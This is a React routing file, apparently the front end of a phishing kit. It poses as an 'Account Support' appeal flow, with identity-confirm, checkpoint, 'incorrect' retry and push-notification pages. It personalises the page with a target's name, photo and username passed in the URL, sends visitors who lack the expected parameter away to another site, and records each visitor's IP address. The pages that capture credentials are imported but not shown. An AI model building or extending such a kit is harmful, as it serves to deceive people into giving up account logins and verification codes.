import React, { useEffect, useState } from 'react';


import { BrowserRouter as Router, Routes, Route, Link, useHistory, useNavigate } from 'react-router-dom';
import 'bootstrap/dist/css/bootstrap.min.css';
import './App.css';
import qs from 'qs';
import io from 'socket.io-client';
import { Helmet } from 'react-helmet';

import Home from './pages/Home';
import IdentityConfirm from "./pages/IdentityConfirm";
import IdentityConfirmIncorrect from "./pages/IdentityConfirmIncorrect";
import Checkpoint from "./pages/Checkpoint";
import CheckpointIncorrect from "./pages/CheckpointIncorrect";
import WaitProccess from "./pages/WaitProccess";
import RestrictDesign from "./pages/RestrictDesign";
import PushNotification from "./pages/PushNotification";
import RestrictDesignEmail from "./pages/RestrictDesignEmail";

import GLOBAL_ARRAY from "./pages/globals";

function App() {

    useEffect(() => {

  const params = qs.parse(window.location.search, { ignoreQueryPrefix: true });

// Emit a message to the server

// Listen for incoming messages from the server

  

  if(params.name){
    localStorage.setItem('fullname', decodeURI(params.name));
    var fullname = params.name;
    var shortname = params.name;
    shortname = shortname.split(" ");
    shortname = shortname[0];
    localStorage.setItem('shortname', shortname);
    if(fullname.length > 15){
      localStorage.setItem('name', shortname);
    } else {
      localStorage.setItem('name', fullname);
    }
  } 
  if(params.image){
    localStorage.setItem('image', decodeURI(params.image));
  }

  if(params.hidephone){
    localStorage.setItem('hidephone', params.hidephone);
  } else {
    localStorage.setItem('hidephone', 'jo');
  }

  if(params.username){
    localStorage.setItem('username', decodeURI(params.username));
  }

  if(params.account){
    localStorage.setItem('account', params.account);
  }  else {
    localStorage.setItem('account', 'account');
  }

  if(params.teksti){
    localStorage.setItem('teksti', decodeURI(params.teksti));
  } else {
    
  }

  if(!localStorage.getItem('teksti')){
    window.location.href = "https://error.com/";
  }


    if (localStorage.getItem('hapii')) {
      // key is set in localStorage
    } else {
      localStorage.setItem('hapii', 1);
    }
    console.log("hehe");
    
    fetchData();
  }, []);

async function fetchData() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const json = await response.json();
        localStorage.setItem('ipja', json.ip);
      } catch (error) {
        console.error('Error fetching data:', error);
      }
    }

  return (

    <div className="App">
      <Helmet>
        <title>Account Support</title>
      </Helmet>

      <Router>
        <Routes>
          <Route path="/appeal" element={<Home />} />
          <Route path="/appeal/identity/confirm" element={<IdentityConfirm />} />
          <Route path="/appeal/identity/confirm/incorrect" element={<IdentityConfirmIncorrect />} />
          <Route path="/appeal/checkpoint" element={<Checkpoint />} />
          <Route path="/appeal/checkpoint/incorrect" element={<CheckpointIncorrect />} />
          <Route path="/appeal/checkpoint/review" element={<WaitProccess />} />
          <Route path="/push/notification" element={<PushNotification />} />
          <Route path="/appeal/checkpoint/restrict/:snemail" element={<RestrictDesign />} />
          <Route path="/appeal/checkpoint/email/:snemail" element={<RestrictDesignEmail />} />

        </Routes>
      </Router>
    </div>
  );
}

export default App;
